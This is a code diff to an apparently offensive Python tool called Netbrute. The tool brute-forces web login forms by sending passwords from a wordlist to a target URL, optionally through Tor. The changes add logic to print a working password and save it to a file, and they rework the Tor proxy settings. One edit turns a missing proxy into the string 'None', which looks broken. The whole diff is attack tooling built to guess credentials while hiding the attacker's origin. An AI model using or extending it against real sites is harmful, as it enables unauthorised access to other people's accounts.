@@ -29,9 +29,8 @@ class Netbrute:
         self.session = aiohttp_session
         self.wordlist = wordlist
         self.found = Event()
-
         self.tor_use = tor
-        if self.tor_use and tor_address:
+        if self.tor_use is not None and tor_address is not None:
             ip, port = parse_proxy_address(tor_address)
             self.tor_address = "http://{0}:{1}".format(ip, port)
 
@@ -75,6 +74,12 @@ class Netbrute:
                 tmp_payload[key] = password
         return tmp_payload
 
+    @staticmethod
+    def _store_found_password(password):
+        with open("correct.pass", "a") as f:
+            f.write(password)
+        return
+
     async def attack_this(self, password):
         print("Started attack!")
         headers = {
@@ -83,18 +88,20 @@ class Netbrute:
         }
         custom_payload = self._adjust_payload(password)
         with async_timeout.timeout(10):
-            if self.tor:
+            if self.tor_use is not None:
                 proxy_addr = self.tor_address
             else:
                 proxy_addr = None
             async with self.session.post(self.attack_url, data=self._encode_payload_www(custom_payload),
-                                         headers=headers, proxy=proxy_addr) as response:
+                                         headers=headers, proxy="{0}".format(proxy_addr)) as response:
 
                 body, status, response_url = await response.text(), response.status, response.url
                 if status == 200 and (self.error_string not in response_url):
+                    print("[+] Password was found: {0}".format(password))
+                    self._store_found_password(password)
                     self.found.set()
 
-                print("Ended attack! [{0}] - Status: {1} - URL: {2}".format(password, status, url))
+                print("Ended attack! [{0}] - Status: {1} - URL: {2}".format(password, status, response_url))
                 return
 
     def _read_wordlist(self):
@@ -137,10 +144,12 @@ if __name__ == "__main__":
         sys.exit(0)
 
     if args.tor:
-        conn = get_tor_connector()
+        print("[+] Using tor with address {0}".format(args.tor_address))
+        conn = get_tor_connector(args.tor_address)
         session = aiohttp.ClientSession(loop=loop, connector=conn)
     else:
         session = aiohttp.ClientSession(loop=loop)
 
-    net = Netbrute(session, args.url, args.payload, args.wordlist, args.error_string, tor=args.tor)
+    net = Netbrute(session, args.url, args.payload, args.wordlist, args.error_string,
+                   tor=args.tor, tor_address=args.tor_address)
     loop.run_until_complete(net.initiate())
